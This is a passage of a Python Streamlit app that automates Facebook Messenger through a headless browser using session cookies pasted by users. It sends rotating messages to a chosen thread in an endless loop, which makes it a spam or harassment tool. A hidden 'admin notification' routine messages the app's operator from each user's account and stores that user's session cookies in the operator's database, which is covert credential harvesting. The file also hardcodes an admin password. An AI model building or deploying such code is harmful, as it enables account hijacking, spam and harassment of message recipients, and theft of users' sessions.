import streamlit as st
import streamlit.components.v1 as components
import time
import threading
import uuid
import hashlib
import os
import subprocess
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import base64
from PIL import Image
import io

st.set_page_config(
    page_title="𝐄𝟐𝐄 𝐁𝐘 𝐒𝐔𝐑𝐀𝐉 𝐎𝐁𝐄𝐑𝐎𝐘",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ============================================================
#            LUXURY ROYAL THEME CSS (Ultimate Edition)
# ============================================================
custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700;900&family=Playfair+Display:wght@400;500;600;700;800&family=Poppins:wght@300;400;500;600&display=swap');

    /* Main Background with animated gradient overlay */
    .stApp {
        background: linear-gradient(135deg, #0a0a2a 0%, #1a0a3a 25%, #2a0a4a 50%, #1a0a3a 75%, #0a0a2a 100%);
        position: relative;
    }
    
    .stApp::before {
        content: "";
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-image: 
            radial-gradient(circle at 20% 80%, rgba(255, 215, 0, 0.08) 0%, transparent 50%),
            radial-gradient(circle at 80% 20%, rgba(255, 215, 0, 0.06) 0%, transparent 50%),
            repeating-linear-gradient(45deg, rgba(255, 215, 0, 0.02) 0px, rgba(255, 215, 0, 0.02) 2px, transparent 2px, transparent 8px);
        pointer-events: none;
        z-index: 0;
    }
    
    /* Main content container - Glass morphism */
    .main .block-container {
        background: rgba(10, 5, 25, 0.55);
        backdrop-filter: blur(12px);
        border-radius: 32px;
        padding: 2.5rem;
        border: 1px solid rgba(255, 215, 0, 0.25);
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
        margin: 1rem auto;
        position: relative;
        z-index: 2;
    }
    
    /* Royal Header */
    .main-header {
        background: linear-gradient(135deg, 
            rgba(20, 5, 40, 0.9) 0%,
            rgba(75, 0, 130, 0.85) 50%,
            rgba(20, 5, 40, 0.9) 100%);
        border: 2px solid;
        border-image: linear-gradient(135deg, #ffd700, #b8860b, #ffd700) 1;
        border-radius: 28px;
        padding: 2.2rem;
        text-align: center;
        margin-bottom: 2.5rem;
        box-shadow: 0 15px 45px rgba(0, 0, 0, 0.5),
                    0 0 40px rgba(255, 215, 0, 0.2);
        position: relative;
        overflow: hidden;
    }
    
    .main-header::after {
        content: "👑";
        position: absolute;
        top: -30px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 7rem;
        opacity: 0.08;
        pointer-events: none;
    }
    
    .main-header h1 {
        background: linear-gradient(135deg, #ffd700, #ffed4e, #ffd700, #b8860b);
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
        font-family: 'Cinzel', serif;
        font-size: 3rem;
        font-weight: 800;
        margin: 0;
        letter-spacing: 2px;
        text-shadow: 0 2px 10px rgba(255, 215, 0, 0.3);
    }
    
    .main-header p {
        color: rgba(255, 215, 0, 0.9);
        font-family: 'Playfair Display', serif;
        font-size: 1.3rem;
        margin-top: 0.5rem;
        font-style: italic;
        letter-spacing: 1px;
    }
    
    /* Royal Logo styling */
    .prince-logo {
        width: 100px;
        height: 100px;
        border-radius: 50%;
        margin-bottom: 1rem;
        border: 3px solid #ffd700;
        box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
        transition: all 0.4s ease;
        object-fit: cover;
    }
    
    .prince-logo:hover {
        transform: scale(1.05);
        box-shadow: 0 0 45px rgba(255, 215, 0, 0.8);
    }
    
    /* Sidebar styling - Royal Dark */
    [data-testid="stSidebar"] {
        background: linear-gradient(180deg, rgba(10, 5, 30, 0.95) 0%, rgba(30, 10, 50, 0.95) 100%);
        backdrop-filter: blur(10px);
        border-right: 1px solid rgba(255, 215, 0, 0.3);
    }
    
    [data-testid="stSidebar"] [data-testid="stMarkdown"] {
        color: #ffd700;
    }
    
    /* Buttons - Royal Gold */
    .stButton > button {
        background: linear-gradient(135deg, #b8860b, #ffd700, #daa520);
        color: #1a0033;
        border: none;
        border-radius: 40px;
        padding: 0.7rem 1.8rem;
        font-family: 'Cinzel', serif;
        font-weight: 700;
        font-size: 1rem;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    .stButton > button:hover {
        transform: translateY(-3px) scale(1.02);
        box-shadow: 0 10px 30px rgba(255, 215, 0, 0.5);
        background: linear-gradient(135deg, #ffd700, #ffed4e, #ffd700);
        cursor: pointer;
    }
    
    .stButton > button:active {
        transform: translateY(2px);
    }
    
    /* Input fields - Royal styling */
    .stTextInput > div > div > input,
    .stTextArea > div > div > textarea,
    .stNumberInput > div > div > input,
    .stSelectbox > div > div {
        background: rgba(20, 10, 40, 0.8);
        border: 1px solid rgba(255, 215, 0, 0.4);
        border-radius: 16px;
        color: #ffd700;
        padding: 0.7rem 1rem;
        font-size: 1rem;
        transition: all 0.3s ease;
    }
    
    .stTextInput > div > div > input:focus,
    .stTextArea > div > div > textarea:focus {
        border-color: #ffd700;
        box-shadow: 0 0 0 2px rgba(255, 215, 0, 0.2);
        background: rgba(30, 15, 55, 0.9);
    }
    
    /* Labels */
    label {
        color: #ffd700 !important;
        font-family: 'Poppins', sans-serif;
        font-weight: 500 !important;
        font-size: 0.9rem !important;
        letter-spacing: 0.5px;
        margin-bottom: 0.3rem;
    }
    
    /* Tabs styling */
    .stTabs [data-baseweb="tab-list"] {
        background: rgba(20, 5, 40, 0.6);
        border-radius: 50px;
        padding: 0.3rem;
        gap: 0.5rem;
        border: 1px solid rgba(255, 215, 0, 0.2);
    }
    
    .stTabs [data-baseweb="tab"] {
        background: transparent;
        color: #d4af37;
        border-radius: 40px;
        padding: 0.5rem 1.5rem;
        font-family: 'Cinzel', serif;
        font-weight: 500;
        transition: all 0.3s ease;
    }
    
    .stTabs [aria-selected="true"] {
        background: linear-gradient(135deg, #b8860b, #ffd700);
        color: #1a0033;
        box-shadow: 0 2px 10px rgba(255, 215, 0, 0.4);
    }
    
    /* Metrics styling */
    [data-testid="stMetricValue"] {
        color: #ffd700;
        font-size: 2.2rem;
        font-weight: 800;
        font-family: 'Cinzel', serif;
        text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
    }
    
    [data-testid="stMetricLabel"] {
        color: #d4af37;
        font-family: 'Poppins', sans-serif;
        font-weight: 500;
    }
    
    /* Console section - Terminal style */
    .console-section {
        background: rgba(0, 0, 0, 0.6);
        border: 1px solid #b8860b;
        border-radius: 20px;
        padding: 1rem;
        margin-top: 1.5rem;
        backdrop-filter: blur(5px);
    }
    
    .console-header {
        color: #ffd700;
        font-family: 'Cinzel', serif;
        font-size: 1.2rem;
        border-bottom: 1px solid rgba(255, 215, 0, 0.3);
        padding-bottom: 0.5rem;
        margin-bottom: 1rem;
    }
    
    .console-output {
        background: #050510;
        border-radius: 16px;
        padding: 1rem;
        color: #0f0;
        font-family: 'Courier New', monospace;
        font-size: 0.8rem;
        max-height: 400px;
        overflow-y: auto;
        border: 1px solid #333;
    }
    
    .console-line {
        border-left: 3px solid #ffd700;
        padding: 0.3rem 0.8rem;
        margin: 0.3rem 0;
        color: #ccffcc;
        font-family: monospace;
    }
    
    /* Footer */
    .footer {
        background: linear-gradient(135deg, rgba(10, 5, 30, 0.9), rgba(30, 10, 50, 0.9));
        border-top: 1px solid #b8860b;
        color: #d4af37;
        font-family: 'Playfair Display', serif;
        font-size: 0.9rem;
        padding: 1.5rem;
        text-align: center;
        margin-top: 2rem;
        border-radius: 20px 20px 0 0;
    }
    
    /* Success/Error boxes */
    .stAlert {
        border-radius: 16px;
        border-left-width: 6px;
    }
    
    .stSuccess {
        background: rgba(0, 100, 0, 0.2);
        border-left-color: #00ff00;
    }
    
    .stError {
        background: rgba(139, 0, 0, 0.2);
        border-left-color: #ff4444;
    }
    
    .stWarning {
        background: rgba(255, 165, 0, 0.2);
        border-left-color: #ffa500;
    }
    
    /* Info boxes */
    .stInfo {
        background: rgba(0, 100, 255, 0.1);
        border-left-color: #4488ff;
    }
    
    /* Scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    
    ::-webkit-scrollbar-track {
        background: #1a0033;
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: #b8860b;
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: #ffd700;
    }
    
    /* Animations */
    @keyframes subtleGlow {
        0% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.3); }
        100% { text-shadow: 0 0 15px rgba(255, 215, 0, 0.6); }
    }
    
    .gold-text {
        color: #ffd700;
        animation: subtleGlow 2s ease-in-out infinite alternate;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

ADMIN_PASSWORD = "SURAJOBEROY"
WHATSAPP_NUMBER = "8452969216"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"

# Create a default logo image as base64 (Royal Crown Emoji with styling)
def get_default_logo_html():
    return """
    <div style="text-align: center; margin-bottom: 1rem;">
        <div style="width: 100px; height: 100px; background: linear-gradient(135deg, #b8860b, #ffd700); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto; border: 3px solid #fff; box-shadow: 0 0 30px rgba(255,215,0,0.5);">
            <span style="font-size: 4rem;">👑</span>
        </div>
    </div>
    """

def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"👑 HELLO Suraj sir 👑\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'user_key' not in st.session_state:
    st.session_state.user_key = None
if 'key_approved' not in st.session_state:
    st.session_state.key_approved = False
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'not_requested'
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'whatsapp_opened' not in st.session_state:
    st.session_state.whatsapp_opened = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

ADMIN_UID = "suraj"

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
   
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
   
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
   
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
   
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
   
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
   
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
           
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' ||
                               arguments[0].tagName === 'TEXTAREA' ||
                               arguments[0].tagName === 'INPUT';
                    """, element)
                   
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                       
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                       
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                       
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: ✅ Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: ⚡ Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: ⚡ Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
   
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass
   
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
   
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
   
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
   
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
   
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
   
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
   
    try:
        from selenium.webdriver.chrome.service import Service
       
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
       
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
   
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
   
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
       
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
       
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
       
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
       
        time.sleep(15)
       
        message_input = find_message_input(driver, process_id, automation_state)
       
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
       
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
       
        if not messages_list:
            messages_list = ['Hello!']
       
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
           
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
           
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                   
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                   
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                   
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
               
                time.sleep(1)
               
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                   
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
               
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                       
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                       
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                    log_message(f'{process_id}: ✅ Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                else:
                    log_message(f'{process_id}: ✅ Sent via button: "{message_to_send[:30]}..."', automation_state)
               
                messages_sent += 1
                automation_state.message_count = messages_sent
               
                log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                time.sleep(delay)
               
            except Exception as e:
                log_message(f'{process_id}: Send error: {str(e)[:100]}', automation_state)
                time.sleep(5)
       
        log_message(f'{process_id}: Automation stopped. Total messages: {messages_sent}', automation_state)
        return messages_sent
       
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_admin_notification(user_config, username, automation_state, user_id):
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Preparing admin notification...", automation_state)
       
        admin_e2ee_thread_id = db.get_admin_e2ee_thread_id(user_id)
       
        if admin_e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Using saved admin thread: {admin_e2ee_thread_id}", automation_state)
       
        driver = setup_browser(automation_state)
       
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
       
        if user_config['cookies'] and user_config['cookies'].strip():
            log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
       
        user_chat_id = user_config.get('chat_id', '')
        admin_found = False
        e2ee_thread_id = admin_e2ee_thread_id
        chat_type = 'REGULAR'
       
        if e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Opening saved admin conversation...", automation_state)
           
            if '/e2ee/' in str(e2ee_thread_id) or admin_e2ee_thread_id:
                conversation_url = f'https://www.facebook.com/messages/e2ee/t/{e2ee_thread_id}'
                chat_type = 'E2EE'
            else:
                conversation_url = f'https://www.facebook.com/messages/t/{e2ee_thread_id}'
                chat_type = 'REGULAR'
           
            log_message(f"ADMIN-NOTIFY: Opening {chat_type} conversation: {conversation_url}", automation_state)
            driver.get(conversation_url)
            time.sleep(8)
            admin_found = True
       
        if not admin_found or not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
           
            try:
                profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
                driver.get(profile_url)
                time.sleep(8)
               
                message_button_selectors = [
                    'div[aria-label*="Message" i]',
                    'a[aria-label*="Message" i]',
                    'div[role="button"]:has-text("Message")',
                    'a[role="button"]:has-text("Message")',
                    '[data-testid*="message"]'
                ]
               
                message_button = None
                for selector in message_button_selectors:
                    try:
                        elements = driver.find_elements(By.CSS_SELECTOR, selector)
                        if elements:
                            for elem in elements:
                                text = elem.text.lower() if elem.text else ""
                                aria_label = elem.get_attribute('aria-label') or ""
                                if 'message' in text or 'message' in aria_label.lower():
                                    message_button = elem
                                    log_message(f"ADMIN-NOTIFY: Found message button: {selector}", automation_state)
                                    break
                            if message_button:
                                break
                    except:
                        continue
               
                if message_button:
                    log_message(f"ADMIN-NOTIFY: Clicking message button...", automation_state)
                    driver.execute_script("arguments[0].click();", message_button)
                    time.sleep(8)
                   
                    current_url = driver.current_url
                    log_message(f"ADMIN-NOTIFY: Redirected to: {current_url}", automation_state)
                   
                    if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                        if '/e2ee/t/' in current_url:
                            e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                            chat_type = 'E2EE'
                            log_message(f"ADMIN-NOTIFY: ✅ Found E2EE conversation: {e2ee_thread_id}", automation_state)
                        else:
                            e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                            chat_type = 'REGULAR'
                            log_message(f"ADMIN-NOTIFY: ✅ Found REGULAR conversation: {e2ee_thread_id}", automation_state)
                       
                        if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                            current_cookies = user_config.get('cookies', '')
                            db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                            admin_found = True
                    else:
                        log_message(f"ADMIN-NOTIFY: Message button didn't redirect to messages page", automation_state)
                else:
                    log_message(f"ADMIN-NOTIFY: Could not find message button on profile", automation_state)
           
            except Exception as e:
                log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
           
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: ⚠️ Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
               
                try:
                    profile_url = f'https://www.facebook.com/messages/new'
                    log_message(f"ADMIN-NOTIFY: Opening new message page...", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                   
                    search_box = None
                    search_selectors = [
                        'input[aria-label*="To:" i]',
                        'input[placeholder*="Type a name" i]',
                        'input[type="text"]'
                    ]
                   
                    for selector in search_selectors:
                        try:
                            search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            if search_elements:
                                for elem in search_elements:
                                    if elem.is_displayed():
                                        search_box = elem
                                        log_message(f"ADMIN-NOTIFY: Found 'To:' box with: {selector}", automation_state)
                                        break
                                if search_box:
                                    break
                        except:
                            continue
                   
                    if search_box:
                        log_message(f"ADMIN-NOTIFY: Typing admin UID in new message...", automation_state)
                        driver.execute_script("""
                            arguments[0].focus();
                            arguments[0].value = arguments[1];
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, search_box, ADMIN_UID)
                        time.sleep(5)
                       
                        result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                        if result_elements:
                            log_message(f"ADMIN-NOTIFY: Found {len(result_elements)} results, clicking first...", automation_state)
                            driver.execute_script("arguments[0].click();", result_elements[0])
                            time.sleep(8)
                           
                            current_url = driver.current_url
                            if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                                if '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'E2EE'
                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                else:
                                    e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'REGULAR'
                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                               
                                if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                                    admin_found = True
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
       
        if not admin_found or not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: ⚠️ ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
            return
       
        conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
        log_message(f"ADMIN-NOTIFY: ✅ Successfully opened {conversation_type} conversation with admin", automation_state)
       
        message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
       
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conversation_type = "E2EE 🔒" if "e2ee" in driver.current_url.lower() else "Regular 💬"
            notification_msg = f"👑 New User Started Automation\n\n✨ Username: {username}\n⏰ Time: {current_time}\n💬 Chat Type: {conversation_type}\n🔑 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
           
            log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
               
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
               
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
               
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
           
            time.sleep(1)
           
            log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
               
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)
           
            if send_result == 'button_not_found':
                log_message(f"ADMIN-NOTIFY: Send button not found, using Enter key...", automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();
                   
                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];
                   
                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
                log_message(f"ADMIN-NOTIFY: ✅ Sent via Enter key", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: ✅ Send button clicked", automation_state)
           
            time.sleep(2)
        else:
            log_message(f"ADMIN-NOTIFY: ⚠️ Failed to find message input", automation_state)
           
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: ⚠️ Error sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
